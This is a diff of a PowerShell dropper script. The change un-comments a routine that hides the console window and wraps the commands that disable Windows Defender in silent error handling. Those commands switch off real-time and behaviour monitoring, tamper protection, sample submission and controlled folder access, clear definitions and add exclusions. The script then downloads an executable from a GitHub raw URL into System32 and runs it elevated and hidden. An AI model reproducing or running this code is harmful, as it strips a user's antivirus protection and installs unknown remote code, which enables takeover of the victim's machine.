@@ -1,22 +1,22 @@
-#Add-Type -TypeDefinition @"
-#using System; 
-#using System.Runtime.InteropServices; 
-#public class WindowHelper 
-#{ 
-#    [DllImport("user32.dll")] 
-#    public static extern IntPtr GetForegroundWindow(); 
-#
-#    [DllImport("user32.dll")] 
-#    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); 
-#
-#    public const int SW_HIDE = 0; 
-#    public static void HideWindow() 
-#    { 
-#        IntPtr handle = GetForegroundWindow(); ShowWindow(handle, SW_HIDE); 
-#    }
-#}
-#"@; 
-#[WindowHelper]::HideWindow();
+Add-Type -TypeDefinition @"
+using System; 
+using System.Runtime.InteropServices; 
+public class WindowHelper 
+{ 
+    [DllImport("user32.dll")] 
+   public static extern IntPtr GetForegroundWindow(); 
+
+    [DllImport("user32.dll")] 
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); 
+
+    public const int SW_HIDE = 0; 
+    public static void HideWindow() 
+    { 
+        IntPtr handle = GetForegroundWindow(); ShowWindow(handle, SW_HIDE); 
+    }
+}
+"@; 
+[WindowHelper]::HideWindow();
 
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {
@@ -25,55 +25,107 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 }
 else
 {
-    # Disable notifications for scan results
-    Set-MpPreference -DisableScanOnRealtimeEnable $true
+    try
+    {
+        # Disable notifications for scan results
+        Set-MpPreference -DisableScanOnRealtimeEnable $true -ErrorAction SilentlyContinue;
+    }catch{}
 
-    # Disable notifications for security intelligence updates
-    Set-MpPreference -DisableBehaviorMonitoring $true
-    Set-MpPreference -DisableIOAVProtection $true
-    Set-MpPreference -DisableScriptScanning $true
+    try
+    {
+        # Disable notifications for security intelligence updates
+        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue;
+        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue;
+        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue;
+    }catch{}
 
-    # Disable UI Exclusions
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "HideExclusionsFromLocalAdmins" -Value 1 -Type DWord
+    try
+    {
+        # Disable UI Exclusions
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "HideExclusionsFromLocalAdmins" -Value 1 -Type DWord -ErrorAction SilentlyContinue;
+    }catch{}
 
-    # Disable UI Exclusions Admin perms
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "HideExclusions" -Value 1 -Type DWord
+    try
+    {
+        # Disable UI Exclusions Admin perms
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "HideExclusions" -Value 1 -Type DWord -ErrorAction SilentlyContinue;
+    }catch{}
 
-    Set-ItemProperty -Path $registryPath -Name "DisableAllNotifications" -Value 1 -Type DWord
+    try
+    {
+        Set-ItemProperty -Path $registryPath -Name "DisableAllNotifications" -Value 1 -Type DWord -ErrorAction SilentlyContinue;
+    }catch{}
 
-    # Clear definitions of a malware file
-    "%ProgramFiles%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All -ErrorAction SilentlyContinue;
+    try
+    {
+        # Clear definitions of a malware file
+        "%ProgramFiles%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All -ErrorAction SilentlyContinue;
+    }catch{}
 
-    # Disable Script Scanning
-    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue;
+    try
+    {
+        # Disable Script Scanning
+        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue;
+    }catch{}
 
-    # Disable Intrusion Prevention System
-    Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue;
+    try
+    {
+        # Disable Intrusion Prevention System
+        Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue;
+    }catch{}
 
-    # Disable real-time protection
-    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue;
+    try
+    {
+        # Disable Intrusion Prevention System
+        Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue;
+    }catch{}
 
-    # Disable cloud-based protection
-    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue;
-    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue;
-    Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue;
+    try
+    {
+        # Disable real-time protection
+        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue;
+    }catch{}
 
-    # Disable automatic sample submission
-    Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue;
+    try
+    {
+        # Disable cloud-based protection
+        Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue;
+        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue;
+        Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue;
+    }catch{}
 
-    # Disable various components
-    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue;
-    Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue;
+    try
+    {
+        # Disable automatic sample submission
+        Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue;
+    }catch{}
 
-    # Network Protection
-    powershell Set-MpPreference -EnableNetworkProtection AuditMode -Force -ErrorAction SilentlyContinue;
+    try
+    {
+        # Disable various components
+        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue;
+        Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue;
+    }catch{}
 
-    # Disable Tamper Protection
-    Import-Module Defender
-    Set-MpPreference -DisableTamperProtection $true-ErrorAction SilentlyContinue;
+    try
+    {
+        # Network Protection
+        powershell Set-MpPreference -EnableNetworkProtection AuditMode -Force -ErrorAction SilentlyContinue;
+    }catch{}
 
-    # Disable Controlled Folder Access
-    Set-MpPreference -EnableControlledFolderAccess Disabled -ErrorAction SilentlyContinue;
+    try
+    {
+        # Disable Tamper Protection
+        Import-Module Defender
+        Set-MpPreference -DisableTamperProtection $true-ErrorAction SilentlyContinue;
+    }catch{}
+    
+    try
+    {
+        # Disable Controlled Folder Access
+        Import-Module Defender
+        Set-MpPreference -EnableControlledFolderAccess Disabled -ErrorAction SilentlyContinue;
+    }catch{}
 
     $paths = @(
         "C:\Program Files\Windows Defender",
@@ -109,11 +161,13 @@ else
     {
         Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
     };
+
     Start-BitsTransfer -Source 'https://raw.githubusercontent.com/aodfs/0/main/1' -Destination 'C:\Windows\System32\winio.exe' -ErrorAction SilentlyContinue;
     if (-not (Test-Path 'C:\Windows\System32\winio.exe'))
     {
         Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/aodfs/0/main/1' -OutFile 'C:\Windows\System32\winio.exe' -ErrorAction SilentlyContinue;
     }
+    
     try
     {
         Start-Process -FilePath 'C:\Windows\System32\winio.exe' -Verb RunAs -WindowStyle Hidden -ErrorAction SilentlyContinue;
@@ -122,13 +176,4 @@ else
     {
         & 'C:\Windows\System32\winio.exe' -ErrorAction SilentlyContinue;
     };
-    $regEntries = Get-ItemProperty -Path $regPath;
-    
-    foreach($entry in $regEntries.PSObject.Properties)
-    {
-        if($entry.Name -ne "PSPath" -and $entry.Name -ne "PSParentPath" -and $entry.Name -ne "PSChildName" -and $entry.Name -ne "PSDrive" -and $entry.Name -ne "PSProvider")
-        {
-            Remove-ItemProperty -Path $regPath -Name $entry.Name
-        }
-    }
 }
